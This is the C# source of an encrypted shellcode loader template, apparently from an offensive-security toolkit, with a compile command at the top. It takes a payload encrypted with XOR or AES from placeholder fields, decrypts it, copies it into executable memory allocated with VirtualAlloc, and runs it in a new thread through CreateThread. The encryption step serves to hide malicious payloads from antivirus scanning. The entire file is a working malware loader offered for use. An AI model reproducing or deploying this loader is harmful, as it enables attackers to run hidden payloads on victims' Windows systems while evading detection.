/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_${cipherType}.exe encryptedShellcodeWrapper_${cipherType}.cs

*/

using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        //==============================================================================
        // CRYPTO FUNCTIONS
        //==============================================================================
        private static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        private static byte[] xor(byte[] cipher, byte[] key) {
            byte[] decrypted = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++) {
                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }

        //--------------------------------------------------------------------------------------------------
        // Decrypts the given a plaintext message byte array with a given 128 bits key
        // Returns the unencrypted message
        //--------------------------------------------------------------------------------------------------
        private static byte[] aesDecrypt(byte[] cipher, byte[] key)
        {
            var IV = cipher.SubArray(0, 16);
            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);
                    }

                    return ms.ToArray();
                }
            }
        }

        //==============================================================================
        // MAIN FUNCTION
        //==============================================================================
        static void Main()
        {
            byte[] encryptedShellcode = new byte[] { ${shellcode} };
            string key = "${key}";
            string cipherType = "${cipherType}";


            byte[] shellcode = null;

            //--------------------------------------------------------------
            // Decrypt the shellcode
            if (cipherType == "xor") {
                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));
            }
            else if (cipherType == "aes") {
                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));
            }
                        
            //--------------------------------------------------------------        	
            // Copy decrypted shellcode to memory
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
    }
}
